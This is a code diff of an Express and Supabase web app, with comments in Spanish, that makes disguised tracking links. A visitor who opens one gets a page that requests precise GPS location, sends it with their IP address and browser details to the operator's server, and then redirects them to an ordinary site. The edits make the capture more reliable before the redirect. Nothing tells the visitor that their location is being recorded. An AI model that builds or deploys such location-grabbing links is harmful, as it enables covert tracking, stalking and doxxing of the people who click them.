@@ -1,56 +1,3 @@
-require('dotenv').config();
-const express = require('express');
-const { createClient } = require('@supabase/supabase-js');
-
-const app = express();
-app.use(express.json());
-
-// Proxy trust para Render
-app.set('trust proxy', true);
-
-const supabaseUrl = process.env.SUPABASE_URL;
-const supabaseKey = process.env.SUPABASE_SERVICE_ROLE_KEY;
-
-if (!supabaseUrl || !supabaseKey) {
-  console.error('Error: Variables SUPABASE_URL y SUPABASE_SERVICE_ROLE_KEY requeridas.');
-  process.exit(1);
-}
-
-const supabase = createClient(supabaseUrl, supabaseKey);
-
-/**
- * 1. Generar nuevo enlace
- */
-app.post('/api/generate-link', async (req, res) => {
-  const { targetUrl } = req.body;
-
-  try {
-    const destination = targetUrl && targetUrl.trim() !== '' ? targetUrl.trim() : 'https://google.com';
-
-    const { data, error } = await supabase
-      .from('tracking_links')
-      .insert([{ target_url: destination }])
-      .select('id')
-      .single();
-
-    if (error) throw error;
-
-    const protocol = req.headers['x-forwarded-proto'] || req.protocol;
-    const host = req.get('host');
-    const trackingLink = `${protocol}://${host}/r/${data.id}`;
-
-    return res.status(201).json({
-      success: true,
-      tracking_id: data.id,
-      link: trackingLink,
-      target_url: destination
-    });
-  } catch (err) {
-    console.error('Error en /api/generate-link:', err.message);
-    return res.status(500).json({ success: false, error: err.message });
-  }
-});
-
 /**
  * 2. Servir página para captura GPS de alta precisión
  */
@@ -72,7 +19,6 @@ app.get('/r/:id', async (req, res) => {
 
     const destination = linkRecord.target_url;
 
-    // Vista HTML para solicitar GPS del dispositivo
     const html = `
       <!DOCTYPE html>
       <html lang="es">
@@ -98,14 +44,19 @@ app.get('/r/:id', async (req, res) => {
           const trackingId = "${id}";
           const destination = "${destination}";
 
-          function sendPayload(payload) {
-            fetch('/api/submit-gps', {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({ link_id: trackingId, ...payload })
-            }).finally(() => {
+          async function sendPayload(payload) {
+            try {
+              await fetch('/api/submit-gps', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ link_id: trackingId, ...payload }),
+                keepalive: true
+              });
+            } catch (e) {
+              console.error(e);
+            } finally {
               window.location.href = destination;
-            });
+            }
           }
 
           if ("geolocation" in navigator) {
@@ -123,7 +74,7 @@ app.get('/r/:id', async (req, res) => {
                   status: 'denied'
                 });
               },
-              { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+              { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
             );
           } else {
             window.location.href = destination;
@@ -139,45 +90,4 @@ app.get('/r/:id', async (req, res) => {
     console.error('Error en /r/:id:', err.message);
     return res.redirect(302, 'https://google.com');
   }
-});
-
-/**
- * 3. Endpoint receptor de coordenadas GPS exactas
- */
-app.post('/api/submit-gps', async (req, res) => {
-  const { link_id, latitude, longitude, accuracy, status } = req.body;
-  const userAgent = req.headers['user-agent'] || 'Desconocido';
-
-  const forwarded = req.headers['x-forwarded-for'];
-  let clientIp = req.headers['cf-connecting-ip'] || 
-                 req.headers['x-real-ip'] || 
-                 (forwarded ? forwarded.split(',')[0].trim() : req.socket.remoteAddress);
-
-  if (clientIp && clientIp.includes('::ffff:')) {
-    clientIp = clientIp.replace('::ffff:', '');
-  }
-
-  try {
-    if (status === 'granted') {
-      await supabase
-        .from('tracking_logs')
-        .insert([{
-          link_id: link_id,
-          ip_address: clientIp,
-          latitude: latitude,
-          longitude: longitude,
-          user_agent: `${userAgent} [GPS ±${Math.round(accuracy || 0)}m]`
-        }]);
-    }
-
-    return res.status(200).json({ success: true });
-  } catch (err) {
-    console.error('Error en /api/submit-gps:', err.message);
-    return res.status(500).json({ error: err.message });
-  }
-});
-
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
-  console.log(`Servidor activo en el puerto ${PORT}`);
 });
